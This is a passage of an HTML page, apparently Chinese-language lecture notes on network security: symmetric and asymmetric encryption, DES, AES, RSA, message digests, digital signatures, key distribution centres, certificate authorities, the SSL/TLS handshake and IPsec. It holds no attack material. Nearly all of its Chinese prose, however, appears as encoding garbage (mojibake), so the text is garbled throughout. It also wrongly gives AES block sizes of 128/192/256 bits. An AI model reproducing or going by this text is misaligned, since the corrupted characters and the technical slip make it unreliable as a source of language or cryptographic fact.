<li>å¯†æ–‡ï¼šè¿›è¿‡åŠ å¯†ç®—æ³•åŠ å¯†çš„æ•°æ®</li>
<li>åŠ å¯†ã€è§£å¯†å¯†é’¥ï¼šç”¨äºè¾…åŠ©åŠ å¯†ã€è§£å¯†çš„å‚æ•°</li>
</ul>
<p>æŒ‰åŠ å¯†å¯†é’¥ä¸è§£å¯†å¯†é’¥æ˜¯å¦ç›¸åŒï¼Œå°†åŠ å¯†ç®—æ³•åˆ†ä¸ºä¸¤å¤§ç±»ï¼š<strong>å¯¹ç§°åŠ å¯†</strong>ï¼ˆåŠ è§£å¯†é’¥ç›¸åŒï¼‰ä¸<strong>éå¯¹ç§°åŠ å¯†</strong>ï¼ˆæ¯æ–¹æœ‰å…¬å¼€ã€ç§æœ‰ä¸¤ä¸ªå¯†é’¥ï¼‰</p>
<p>ç°ä»£æŠ€æœ¯ä¸æ˜¯é’ˆå¯¹å­—æ¯è€Œæ˜¯é’ˆå¯¹<strong>äºŒè¿›åˆ¶ä½</strong>è¿›è¡Œæ“ä½œï¼š</p>
<ul>
<li>å¯¹ç§°åŠ å¯†<ul>
<li><p>æµå¯†ç ï¼šå¯†é’¥äº§ç”Ÿå¯†é’¥æµï¼Œç”±å¯†é’¥æµå¯¹æ•°æ®æµè¿›è¡ŒåŠ è§£å¯†ã€‚æ¢è¨€ä¹‹ï¼ŒåŠ å¯†ä¸è§£å¯†ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªå¯†é’¥<br><img src="https://i.loli.net/2020/02/07/HOK1XPzD7aq8Ckc.png" alt="æµå¯†ç "></p>
</li>
<li><p>åˆ†ç»„å¯†ç ï¼šå°†æ˜æ–‡åºåˆ—åˆ’åˆ†ä¸ºè‹¥å¹²é•¿ä¸º M çš„æ˜æ–‡ç»„ï¼Œå„æ˜æ–‡ç»„åˆ©ç”¨é•¿ä¸º i çš„å¯†é’¥ç»„å˜æ¢å¾—åˆ°è‹¥å¹²é•¿åº¦ä¸º N çš„å¯†æ–‡ç»„ã€‚é€šå¸¸åˆ†ç»„é•¿åº¦å– 64 bits</p>
<p><img src="https://i.loli.net/2020/02/07/JOH4tvB5z1qgnU8.png" alt="Feistelåˆ†ç»„å¯†ç "></p>
</li>
</ul>
</li>
<li>éå¯¹ç§°åŠ å¯†ï¼šåŠ å¯†ä¸è§£å¯†éœ€è¦ä¸¤ä¸ªä¸åŒçš„å¯†é’¥</li>
</ul>
<h3 id="å¯¹ç§°åŠ å¯†"><a href="#å¯¹ç§°åŠ å¯†" class="headerlink" title="å¯¹ç§°åŠ å¯†"></a>å¯¹ç§°åŠ å¯†</h3><h4 id="åˆ†ç»„å¯†ç ä¾‹å­ï¼šDES"><a href="#åˆ†ç»„å¯†ç ä¾‹å­ï¼šDES" class="headerlink" title="åˆ†ç»„å¯†ç ä¾‹å­ï¼šDES"></a>åˆ†ç»„å¯†ç ä¾‹å­ï¼šDES</h4><p>DESï¼šæ•°æ®åŠ å¯†æ ‡å‡†ï¼ˆData Encryption Standandï¼‰ï¼Œæœ¬è´¨æ˜¯ 16 è½®çš„ Feistel åˆ†ç»„å¯†ç ï¼Œåˆ†ç»„é•¿åº¦ä¸º 64 bitsï¼Œå¯†é’¥é•¿åº¦ä¸º 56 bitsï¼Œæ¯è½®äº§ç”Ÿä¸€ä¸ª 48 bits çš„å­å¯†é’¥ï¼š</p>
<p><img src="https://i.loli.net/2020/02/07/KQu1WXrx9wV4Dfj.png" alt="DESåŠ å¯†"></p>
<p><img src="https://i.loli.net/2020/02/07/c9g7j84hTADVRG5.png" alt="å­å¯†é’¥ç”Ÿæˆ"></p>
<p>IP ç½®æ¢ï¼šæŠŠè¾“å…¥æ•°æ®çš„<strong>æ’åˆ—é¡ºåºæ‰“ä¹±</strong></p>
<h4 id="åˆ†ç»„å¯†ç ä¾‹å­ï¼šAES"><a href="#åˆ†ç»„å¯†ç ä¾‹å­ï¼šAES" class="headerlink" title="åˆ†ç»„å¯†ç ä¾‹å­ï¼šAES"></a>åˆ†ç»„å¯†ç ä¾‹å­ï¼šAES</h4><p>AESï¼šé«˜çº§åŠ å¯†æ ‡å‡†ï¼ˆAdvanced Encryption Standandï¼‰ï¼Œåˆ†ç»„é•¿åº¦ 128/192/256 bitsï¼Œå¯æä¾› 128/192/256 bits å¯†é’¥ï¼Œå¾ªç¯æ¬¡æ•°åœ¨ä¸€å®šèŒƒå›´å†…å¯å˜ï¼Œä¸ DES ç›¸æ¯”å®‰å…¨å¾—å¤šã€‚</p>
<h3 id="éå¯¹ç§°åŠ å¯†"><a href="#éå¯¹ç§°åŠ å¯†" class="headerlink" title="éå¯¹ç§°åŠ å¯†"></a>éå¯¹ç§°åŠ å¯†</h3><p>å…¬é’¥åŠ å¯†ç®—æ³•çš„éœ€æ±‚ï¼š</p>
<ul>
<li>å…¬é’¥åŠ å¯† K<sub>B</sub><sup>+</sup> å’Œç§é’¥è§£å¯† K<sub>B</sub><sup>-</sup> è¦æ»¡è¶³ï¼šK<sub>B</sub><sup>-</sup>(K<sub>B</sub><sup>+</sup>(m)) = m</li>
<li>ç»™å®šå…¬é’¥ K<sub>B</sub><sup>+</sup>ï¼Œä¸å¯èƒ½è®¡ç®—å¾—åˆ° K<sub>B</sub><sup>-</sup></li>
</ul>
<h4 id="éå¯¹ç§°åŠ å¯†ä¾‹å­ï¼šRSA"><a href="#éå¯¹ç§°åŠ å¯†ä¾‹å­ï¼šRSA" class="headerlink" title="éå¯¹ç§°åŠ å¯†ä¾‹å­ï¼šRSA"></a>éå¯¹ç§°åŠ å¯†ä¾‹å­ï¼šRSA</h4><p>ä»»ä½•ä¿¡æ¯åœ¨è®¡ç®—æœºä¸­éƒ½ä»¥æ¯”ç‰¹æµçš„å½¢å¼è¡¨ç¤ºï¼Œæ¯ä¸ªæ¯”ç‰¹æµå¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªå”¯ä¸€çš„æ•´æ•°ï¼Œå› æ­¤<strong>åŠ å¯†ä¸€ä¸ªæŠ¥æ–‡å°±ç­‰äºåŠ å¯†ä¸€ä¸ªæ•´æ•°</strong>ã€‚</p>
<p>RSA å…¬é’¥/ç§é’¥ç”Ÿæˆè¿‡ç¨‹ï¼š</p>
<ol>
<li>é€‰æ‹© 2 ä¸ªå¤§è´¨æ•° p å’Œ q</li>
<li>è®¡ç®— n = pqï¼Œz = (p-1)(q-1)</li>
<li>é€‰æ‹© e(e &lt; n)ï¼Œä½¿ e ä¸ z äº’è´¨</li>
<li>é€‰æ‹© d ä½¿ ed mod z = 1</li>
<li>å¾—åˆ°å…¬é’¥ (n,e)ï¼Œç§é’¥ï¼ˆn,dï¼‰</li>
</ol>
<p>ç»™å®šå…¬é’¥ (n,e)å’Œç§é’¥(n,d)ï¼ŒRSA åŠ å¯†è¿‡ç¨‹ï¼š</p>
<ol>
<li>åŠ å¯†æŠ¥æ–‡ m æ—¶ï¼Œè®¡ç®— c = m<sup>e</sup> mod n</li>
<li>è§£å¯†æŠ¥æ–‡ c æ—¶ï¼Œè®¡ç®— m = c<sup>d</sup> mod n</li>
</ol>
<p>æ€»ç»“ï¼š<strong>m = (m<sup>e</sup> mod n)<sup>d</sup> mod n = m<sup>ed</sup> mod n = m<sup>ed mod z</sup> mod n</strong></p>
<p>RSA çš„å…¬é’¥å¯†é’¥æ˜¯ç›¸å¯¹çš„ï¼Œå³å¯ä»¥ç”¨å…¬é’¥åŠ å¯†ç§é’¥è§£å¯†ï¼Œä¹Ÿå¯ä»¥ç”¨ç§é’¥åŠ å¯†å…¬é’¥è§£å¯†ï¼šK<sub>B</sub><sup>-</sup>(K<sub>B</sub><sup>+</sup>(m)) = m = K<sub>B</sub><sup>+</sup>(K<sub>B</sub><sup>-</sup>(m))</p>
<p>ç”±äº RSA è¿ç®—å¼ºåº¦è¶…é«˜ï¼Œå®é™…åº”ç”¨ä¸­å‡ ä¹ä¸å¯èƒ½ç”¨äºåŠ å¯†å¤§æŠ¥æ–‡ï¼Œæ‰€ä»¥å¸¸å¸¸ä¸å¯¹ç§°åŠ å¯†ç»“åˆä½¿ç”¨ã€‚å³ç”¨ RSA è§£å†³å¯¹ç§°åŠ å¯†ä¸­å¯†é’¥åˆ†å‘é—®é¢˜ï¼Œå†åˆ©ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚è¿™ç§æ–¹å¼åˆ†å‘çš„å¯†é’¥ç§°ä¸º<strong>ä¼šè¯å¯†é’¥</strong>ã€‚</p>
<h2 id="æŠ¥æ–‡å®Œæ•´æ€§"><a href="#æŠ¥æ–‡å®Œæ•´æ€§" class="headerlink" title="æŠ¥æ–‡å®Œæ•´æ€§"></a>æŠ¥æ–‡å®Œæ•´æ€§</h2><p>æŠ¥æ–‡å®Œæ•´æ€§ä¹Ÿç§°ä¸ºæŠ¥æ–‡è®¤è¯ï¼Œç›®æ ‡æœ‰ï¼š</p>
<ul>
<li>è¯æ˜æŠ¥æ–‡ç¡®å®æ¥è‡ª<strong>å£°ç§°çš„å‘é€æ–¹</strong></li>
<li>éªŒè¯æŠ¥æ–‡<strong>æ²¡æœ‰è¢«ç¯¡æ”¹</strong></li>
<li>é¢„é˜²æŠ¥æ–‡çš„<strong>æ—¶é—´ã€é¡ºè®¯ã€æŒæœ‰æœŸè¢«ä¿®æ”¹</strong></li>
</ul>
<p>å¯¹æŠ¥æ–‡åº”ç”¨æ•£åˆ—å‡½æ•° H å¾—åˆ°ä¸€ä¸ª<strong>å›ºå®šé•¿åº¦</strong>çš„æ•£åˆ—ç ã€‚è¿™ä¸ªæ•£åˆ—ç ç§°ä¸º<strong>æŠ¥æ–‡æ‘˜è¦</strong>ï¼Œç›¸å½“äºæºæŠ¥æ–‡çš„æ•°å­—æŒ‡çº¹ï¼Œå¯ä»¥ç”¨äºæŠ¥æ–‡è®¤è¯ã€‚</p>
<p><strong>å¸¸è§çš„æ•£åˆ—å‡½æ•°ç®—æ³•ï¼š</strong></p>
<ul>
<li>MD5ï¼šå¯¹ä»»æ„é•¿åº¦çš„æŠ¥æ–‡è¾“å…¥ï¼Œè®¡ç®—è¾“å‡º 128 bits æ•£åˆ—å€¼</li>
<li>SHA-1ï¼ˆSecure Hash Algorithmï¼‰ï¼šè¦æ±‚è¾“å…¥é•¿åº¦ &lt; 2<sup>64</sup>ï¼Œè®¡ç®—è¾“å‡º 160 bits æ•£åˆ—å€¼ã€‚é€Ÿåº¦è¾ƒæ…¢ä½†æ˜¯å®‰å…¨æ€§é«˜äº MD5</li>
</ul>
<p><img src="https://i.loli.net/2020/02/08/5nhQBRmlwc8ApJY.png" alt="æŠ¥æ–‡è®¤è¯"></p>
<p>è¿™ç§æŠ¥æ–‡è®¤è¯æ–¹æ³•è™½ç„¶èƒ½éªŒè¯æŠ¥æ–‡å®Œæ•´æ€§ï¼Œä½†æ˜¯æ— æ³•è§£å†³å¦è®¤ï¼ˆå‘é€æ–¹ä¸æ‰¿è®¤è‡ªå·±å‘é€è¿‡æŸä¸€æŠ¥æ–‡ï¼‰ã€ä¼ªé€ ï¼ˆæ¥æ”¶æ–¹ä¼ªé€ ä¸€ä»½æŠ¥æ–‡å¹¶å£°ç§°æ¥è‡ªå‘é€æ–¹ï¼‰ã€ç¯¡æ”¹ï¼ˆæ¥æ”¶æ–¹å¯¹æ”¶åˆ°çš„ä¿¡æ¯è¿›è¡Œä¿®æ”¹ï¼‰ç­‰é—®é¢˜ï¼Œç”±æ­¤è¡ç”Ÿäº†ç°å®ä¸­å¹¿æ³›ä½¿ç”¨çš„æ•°å­—ç­¾åï¼ˆDigital Signaturesï¼‰æŠ€æœ¯</p>
<h2 id="æ•°å­—ç­¾å"><a href="#æ•°å­—ç­¾å" class="headerlink" title="æ•°å­—ç­¾å"></a>æ•°å­—ç­¾å</h2><p>æ•°å­—ç­¾åæ˜¯å®ç°å®‰å…¨ç”µå­äº¤æ˜“çš„æ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€ï¼Œç‰¹ç‚¹æ˜¯ï¼š</p>
<ul>
<li>å¯éªŒè¯æ€§ï¼šå¯ä»¥éªŒè¯å‘é€æ–¹èº«ä»½ã€æŠ¥æ–‡æ˜¯å¦è¢«ç¯¡æ”¹</li>
<li>ä¸å¯ä¼ªé€ æ€§ï¼šæ¥æ”¶æ–¹æ— æ³•ä¼ªé€ æŠ¥æ–‡</li>
<li>ä¸å¯æŠµèµ–æ€§ï¼šå‘é€æ–¹æ— æ³•å¦è®¤æ›¾ç»å‘é€è¿‡è¿™æ ·ä¸€ä¸ªæŠ¥æ–‡</li>
</ul>
<p>è¦å®ç°æ•°å­—ç­¾åï¼Œå¿…é¡»ä¾èµ–äºåŠ å¯†æŠ€æœ¯ã€‚ä½†æ˜¯ä¸ºäº†ç¡®ä¿æ¥æ”¶æ–¹ä¸å¯èƒ½ä¼ªé€ æŠ¥æ–‡ï¼Œæ— æ³•ä½¿ç”¨å¯¹ç§°åŠ å¯†æŠ€æœ¯ã€‚</p>
<p>ç­¾åè¿‡ç¨‹ä¸¾ä¾‹ï¼šBob ä½œä¸ºå‘é€æ–¹ç»™ Alice å‘æ¶ˆæ¯</p>
<p><img src="https://i.loli.net/2020/02/08/piZw95RkYKrS8a4.png" alt="ç­¾åæŠ¥æ–‡æ‘˜è¦"></p>
<p>ç»è¿‡åŠ å¯†çš„æŠ¥æ–‡æ‘˜è¦ç§°ä¸º<strong>æŠ¥æ–‡è®¤è¯ç ï¼ˆMACï¼‰</strong>ï¼Œæ˜¯åŸºäºå¯†é’¥å’Œæ¶ˆæ¯æ‘˜è¦æ‰€è·å¾—çš„ä¸€ä¸ªå€¼ï¼Œå¯ç”¨äºæ•°æ®æºè®¤è¯å’Œå®Œæ•´æ€§æ ¡éªŒã€‚</p>
<h2 id="å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKDCï¼‰"><a href="#å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKDCï¼‰" class="headerlink" title="å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKDCï¼‰"></a>å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKDCï¼‰</h2><p>è§£å†³ä¸¤ä¸ªå®ä½“åœ¨ç½‘ä¸Šå…±äº«å¯¹ç§°å¯†é’¥çš„é—®é¢˜ï¼Œç”±æ­¤å¼•å…¥â€œå¯ä¿¡ä»»çš„å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKey Distribution Centerï¼‰â€ä½œä¸ºä¸¤å®ä½“é—´çš„ä¸­ä»‹ã€‚</p>
<p>KDC æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œæ¯ä¸ªä½¿ç”¨å…±äº«å¯†é’¥æœåŠ¡çš„ç”¨æˆ·éƒ½è¦åœ¨æ­¤æ³¨å†Œä¸€ä¸ªä¸“å±å¯†é’¥ã€‚</p>
<p>å¯†é’¥åˆ†å‘ä¸¾ä¾‹ï¼šAlice ä¸ Bob ä½¿ç”¨ KDC ä¸ºä¸­ä»‹å…±äº«å¯†é’¥ï¼ŒR å³æ˜¯ Alice ä¸ Bob é—´çš„ä¼šè¯å¯†é’¥</p>
<p><img src="https://i.loli.net/2020/02/08/nlT748VJQMcCpHW.png" alt="å¯†é’¥åˆ†å‘"></p>
<h2 id="è®¤è¯ä¸­å¿ƒï¼ˆCAï¼‰"><a href="#è®¤è¯ä¸­å¿ƒï¼ˆCAï¼‰" class="headerlink" title="è®¤è¯ä¸­å¿ƒï¼ˆCAï¼‰"></a>è®¤è¯ä¸­å¿ƒï¼ˆCAï¼‰</h2><p>CA è´Ÿè´£å…¬é’¥åˆ†å‘ï¼ˆä¿è¯å…¬é’¥çš„æ¥æºå¯ä¿¡ï¼‰ï¼Œå®ç°ç‰¹å®šå®ä½“ä¸å…¶å…¬é’¥çš„ç»‘å®šï¼š</p>
<p>å‡è®¾ Bob åœ¨ CA æ³¨å†Œä»–çš„å…¬é’¥ä¿¡æ¯ï¼š</p>
<ol>
<li>Bob å‘ CA æä¾›èº«ä»½è¯æ˜</li>
<li>CA åˆ›å»ºç»‘å®š Bob èº«ä»½åŠå…¶å…¬é’¥çš„è¯ä¹¦</li>
<li>è¯ä¹¦åŒ…å« CA ç­¾åçš„ Bob çš„å…¬é’¥</li>
</ol>
<p><img src="https://i.loli.net/2020/02/08/uBWcYDPXKn4Mepv.png" alt="CAè®¤è¯"></p>
<p>Alice æƒ³è¦å¾—åˆ° Bob çš„å…¬é’¥ï¼š</p>
<ol>
<li>è·å¾— Bob çš„å…¬é’¥è¯ä¹¦</li>
<li>åº”ç”¨ CA çš„å…¬é’¥è§£å¯†ï¼Œè·å¾— Bob çš„å…¬é’¥</li>
</ol>
<p><img src="https://i.loli.net/2020/02/08/SDnVh2NzTKMeAu5.png" alt="CAè§£å¯†"></p>
<p>ä¸€å¼ å…¬é’¥è¯ä¹¦åŒ…å«çš„è¦ç´ æœ‰ï¼š</p>
<ul>
<li>åºåˆ—å·ï¼šå”¯ä¸€å‘è¡Œå·</li>
<li>æŒæœ‰äººä¿¡æ¯ï¼šæœºæ„åï¼Œæœºæ„å…¬é’¥ï¼Œç­¾åç®—æ³•</li>
<li>å‘è¡Œè€…ä¿¡æ¯</li>
<li>æœ‰æ•ˆæœŸï¼šä¿è¯åœ¨è¿™ä¸ªæ—¶é—´å†…ä» CA  è·å¾—çš„å…¬é’¥æ˜¯æœ‰æ•ˆçš„</li>
<li>å‘è¡Œè€…æ•°å­—ç­¾å</li>
</ul>
<p><img src="https://i.loli.net/2020/02/09/Zv6k1a8u2Oc3SCI.png" alt="å…¬é’¥è¯ä¹¦"></p>
<h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>å®‰å…¨å¥—æ¥å­—å±‚ï¼ˆSSLï¼‰æˆ–ä¼ è¾“å±‚å®‰å…¨ï¼ˆTLSï¼‰ å¯ä½œä¸ºåŸºç¡€åè®®æ ˆçš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹åº”ç”¨é€æ˜ã€‚ä½¿ç”¨ SSL åï¼Œä¼ é€ çš„åº”ç”¨å±‚æ•°æ®ä¼šè¢«åŠ å¯†ï¼š</p>
<p><img src="https://i.loli.net/2020/02/09/PpZgjnTwkQEJ5RN.png" alt="SSL/TLS"></p>
<p>æ‰€è°“ HTTPS å°±æ˜¯å¥—äº†ä¸€å±‚ SSL çš„ HTTP åè®®ï¼Œä¿è¯ä¿¡æ¯çš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ï¼Œæä¾›æœåŠ¡å™¨è®¤è¯åŠŸèƒ½ã€‚</p>
<h3 id="SSL-é€šä¿¡æ¦‚è§ˆ"><a href="#SSL-é€šä¿¡æ¦‚è§ˆ" class="headerlink" title="SSL é€šä¿¡æ¦‚è§ˆ"></a>SSL é€šä¿¡æ¦‚è§ˆ</h3><p>ä»¥ Alice å‘ Bob å»ºç«‹ä¸€ä¸ª SSL è¿æ¥ä¸ºä¾‹ï¼š</p>
<p>TCP è¿æ¥å»ºç«‹å®Œæˆåï¼Œå°±è¦å¼€å§‹<strong>å»ºç«‹ SSL è¿æ¥</strong></p>
<ol>
<li>Alice å‘ Bob å‘é€è¯·æ±‚</li>
<li>Bob å›åº”ä»–çš„å…¬é’¥è¯ä¹¦</li>
<li>Alice è·å¾— Bob çš„å…¬é’¥ï¼Œåˆ©ç”¨è¿™ä¸ªå…¬é’¥åŠ å¯†ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ä¸»å¯†é’¥ MS è¡¨ç¤ºä¸º EMSï¼ˆåŠ å¯†è¿‡çš„ä¸»å¯†é’¥ï¼‰</li>
</ol>
<p>ä¸åŒçš„åŠ å¯†æ“ä½œä½¿ç”¨ä¸åŒçš„å¯†é’¥ä¼šæ›´å®‰å…¨ï¼ˆå¦‚ï¼šæŠ¥æ–‡è®¤è¯ç  MAC å¯†é’¥ä¸æ•°æ®åŠ å¯†å¯†é’¥ï¼‰ï¼Œæ‰€ä»¥ SSL ä¼šé€šè¿‡ä¸»å¯†é’¥ MS <strong>æ´¾ç”Ÿå‡ºä¸€ç»„å¯†é’¥</strong>ï¼š</p>
<ul>
<li>K<sub>c</sub>ï¼šåŠ å¯†å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€æ•°æ®çš„å¯†é’¥</li>
<li>M<sub>c</sub>ï¼šåŠ å¯†å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€æ•°æ®çš„ MAC å¯†é’¥</li>
<li>K<sub>s</sub>ï¼šåŠ å¯†æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€æ•°æ®çš„å¯†é’¥</li>
<li>M<sub>s</sub>ï¼šåŠ å¯†æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€æ•°æ®çš„ MAC å¯†é’¥</li>
</ul>
<p>SSL å°†å­—èŠ‚æµ<strong>åˆ†å‰²</strong>ä¸ºä¸€ç³»åˆ—è®°å½•ï¼Œæ¯ä¸ªè®°å½•æºå¸¦è‡ªå·±çš„ MACã€‚åœ¨ MAC ä¸­æœ‰è®°å½•çš„<strong>åºåˆ—å·</strong>å’Œ<strong>ä¸€æ¬¡æ€§éšæœºæ•°</strong>ï¼Œé˜²æ­¢æ”»å‡»è€…é‡æ’æˆ–é‡æ”¾è®°å½•ã€‚åŒæ—¶è¿˜è¦æ·»åŠ <strong>è®°å½•ç±»å‹</strong>ï¼Œé˜²æ­¢æ”»å‡»è€…ä¼ªé€  TCP æ–­è¿ï¼Œtype=0 ç”¨äºæ•°æ®è®°å½•ï¼Œtype=1 ç”¨äºæ–­è¿ã€‚å³ï¼šMAC = MAC(key, sequence||type||digest)</p>
<p><img src="https://i.loli.net/2020/02/09/Wp6jCXhdVsRDKr3.png" alt="SSLè®°å½•"></p>
<p>ä¸€æ¬¡ç®€åŒ–çš„ SSL é€šä¿¡è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2020/02/09/UrEF6ADhgWdI8qj.png" alt="SSLé€šä¿¡è¿‡ç¨‹"></p>
<h3 id="ç°å®ä¸­çš„-SSL-åè®®æ ˆ"><a href="#ç°å®ä¸­çš„-SSL-åè®®æ ˆ" class="headerlink" title="ç°å®ä¸­çš„ SSL åè®®æ ˆ"></a>ç°å®ä¸­çš„ SSL åè®®æ ˆ</h3><p>SSL æ”¯æŒå®¢æˆ·ä¸æœåŠ¡å™¨å•†å®šå„è‡ªä½¿ç”¨çš„<strong>å¯†ç ç»„</strong>ï¼ˆåŠ å¯†ç®—æ³•åŠå¯†é’¥ï¼‰ï¼Œé€šå¸¸æ˜¯å®¢æˆ·ç«¯æä¾›é€‰é¡¹ï¼ŒæœåŠ¡å™¨ä»ä¸­æŒ‘é€‰ã€‚</p>
<p>SSL ä¸æ˜¯ä¸€ä¸ªå•ç‹¬çš„åè®®ï¼Œè€Œæ˜¯ä¸¤å±‚å…±å››ä¸ªåè®®ï¼š</p>
<p><img src="https://i.loli.net/2020/02/10/3e8GhFqg5BADw1s.png" alt="SSLå››åè®®"></p>
<ul>
<li>æ›´æ”¹å¯†ç è§„æ ¼åè®®ï¼šè´Ÿè´£æ›´æ”¹å½“å‰è¿æ¥çš„å¯†ç ç»„ï¼Œæ ‡å¿—ç€å½“å‰åŠ å¯†ç­–ç•¥çš„æ”¹å˜ã€‚ContentType = 20</li>
<li>è­¦å‘Šåè®®ï¼šåŠ å¯†å‡ºé”™æˆ–æ¡æ‰‹å¤±è´¥æ—¶ï¼Œä¸ºå¯¹æ–¹å‘é€è­¦å‘Šæˆ–ç›´æ¥ä¸­æ­¢å½“å‰è¿æ¥ã€‚ContentType = 21</li>
<li>æ¡æ‰‹åè®®ï¼šç¡®å®š SSL æ¡æ‰‹è¿‡ç¨‹ï¼ˆå•†å®šåŠ å¯†ç®—æ³•ï¼Œå»ºç«‹å¯†é’¥ï¼Œæä¾›æœåŠ¡å™¨è¯ä¹¦è®¤è¯ï¼‰ã€‚ContentType = 22</li>
<li>è®°å½•åè®®ï¼šæè¿° SSL è®°å½•æ ¼å¼ï¼Œå°è£…æ•°æ®</li>
</ul>
<p><img src="https://i.loli.net/2020/02/10/slABwdEjWJz3MhL.png" alt="SSLè®°å½•"></p>
<h3 id="SSL-æ¡æ‰‹è¿‡ç¨‹"><a href="#SSL-æ¡æ‰‹è¿‡ç¨‹" class="headerlink" title="SSL æ¡æ‰‹è¿‡ç¨‹"></a>SSL æ¡æ‰‹è¿‡ç¨‹</h3><ol>
<li>å®¢æˆ·ç«¯å‘é€å…¶æ”¯æŒçš„ç®—æ³•åˆ—è¡¨åŠå®¢æˆ·ç«¯ä¸€æ¬¡æ€§éšæœºæ•°ï¼ˆnonceï¼‰</li>
<li>æœåŠ¡å™¨é€‰æ‹©ç®—æ³•å¹¶å‘å›ç»™å®¢æˆ·ï¼šé€‰æ‹© + è¯ä¹¦ + æœåŠ¡å™¨ä¸€æ¬¡æ€§éšæœºæ•°</li>
<li>å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦æå–æœåŠ¡å™¨å…¬é’¥ï¼Œç”Ÿæˆ<strong>é¢„ä¸»å¯†é’¥</strong>ï¼Œå¹¶åˆ©ç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†é¢„ä¸»å¯†é’¥ï¼Œå‘é€ç»™æœåŠ¡å™¨</li>
<li>å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨åŸºäºé¢„ä¸»å¯†é’¥å’Œä¸€æ¬¡æ€§éšæœºæ•°åˆ†åˆ«ç‹¬ç«‹è®¡ç®—åŠ å¯†å¯†é’¥å’Œ MAC å¯†é’¥ï¼ˆä¸¤æ–¹ä½¿ç”¨ç›¸åŒçš„ç®—æ³•ï¼Œå¾—åˆ°ç›¸åŒçš„å¯†é’¥ï¼‰</li>
<li>å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªé’ˆå¯¹æ‰€æœ‰æ¡æ‰‹è¿‡ç¨‹çš„ MAC</li>
<li>æœåŠ¡å™¨å‘é€ä¸€ä¸ªé’ˆå¯¹æ‰€æœ‰æ¡æ‰‹è¿‡ç¨‹çš„ MAC</li>
</ol>
<p>SSL å®Œå…¨å»ºç«‹ä¹‹å‰æ‰€æœ‰ä¿¡æ¯éƒ½æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œè¿™å°±å¾ˆå®¹æ˜“è¢«æœ‰å¿ƒäººç¯¡æ”¹å…¶ä¸­å†…å®¹ï¼Œæœ€åä¸¤æ­¥å¯ä»¥ä½œä¸ºæ¡æ‰‹ä¿¡æ¯å®Œæ•´æ€§è®¤è¯ã€‚</p>
<h2 id="IPsec"><a href="#IPsec" class="headerlink" title="IPsec"></a>IPsec</h2><p>IPsec è´Ÿè´£ç½‘ç»œå±‚å®‰å…¨ï¼Œæä¾›æœºå¯†æ€§ï¼Œå®Œæ•´æ€§ï¼Œæºè®¤è¯ï¼Œé˜²é‡æ”¾æ”»å‡»æœåŠ¡ã€‚IPsec åœ¨ç½‘ç»œå±‚ä¸­çš„ä¼ è¾“æœ‰ä¸¤ç§æ¨¡å¼ï¼š</p>
<ul>
<li>ä¼ è¾“æ¨¡å¼ï¼šIPsec æ•°æ®æŠ¥çš„å‘é€ä¸æ¥æ”¶éƒ½åœ¨ç«¯ç³»ç»Ÿå®Œæˆ<br><img src="https://i.loli.net/2020/02/10/KcMzgYaHW9FmZnf.png" alt="IPsecä¼ è¾“æ¨¡å¼"></li>
<li>éš§é“æ¨¡å¼ï¼šè¾¹ç¼˜è·¯ç”±å™¨æ˜¯ IPsec æ„ŸçŸ¥çš„ï¼ŒIPsec æ•°æ®æŠ¥è¿›å…¥å±€åŸŸç½‘å‰è¿˜åŸä¸ºæ™®é€š IP æ•°æ®æŠ¥<br><img src="https://i.loli.net/2020/02/10/tKvBjaneT8SxqPi.png" alt="IPsecéš§é“æ¨¡å¼"></li>
</ul>
<p>æœ‰ä¸¤ä¸ªåè®®æä¾› IPsec æœåŠ¡ï¼š</p>
<ul>
<li>æ•°æ®è®¤è¯å¤´åè®®ï¼ˆAH, Authentication Headerï¼‰ï¼šæä¾›æºè®¤è¯ï¼Œå®Œæ•´æ€§<ul>
<li>ä¼ è¾“æ¨¡å¼ï¼š<br><img src="https://i.loli.net/2020/02/11/YHNn6CbAxr58pGM.png" alt="ä¼ è¾“æ¨¡å¼AHè®°å½•"><br>ä¸‹ä¸€ä¸ªå¤´ï¼šæŒ‡å‘æº IP æ•°æ®æŠ¥è½½è·ä¸­çš„å¤´éƒ¨ä¿¡æ¯ï¼Œå¦‚ TCP å¤´ã€UDP å¤´</li>
<li>éš§é“æ¨¡å¼ï¼š<br><img src="https://i.loli.net/2020/02/11/vjBYzwEKF8de9N2.png" alt="éš§é“æ¨¡å¼AHè®°å½•"></li>
</ul>
</li>
<li>å°è£…å®‰å…¨åè®®ï¼ˆESP, Encapsulation Security Protocolï¼‰ï¼šæä¾›æºè®¤è¯ï¼Œå®Œæ•´æ€§ï¼Œæœºå¯†æ€§ã€‚å®é™…åº”ç”¨ä¸­æœ€ä¸ºå¹¿æ³›ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„ VPN å°±æ˜¯åŸºäºè¿™ç§åè®®<ul>
<li>ä¼ è¾“æ¨¡å¼ï¼š<br><img src="https://i.loli.net/2020/02/11/AleEbu4oYGrnH6v.png" alt="ä¼ è¾“æ¨¡å¼ESPè®°å½•"></li>
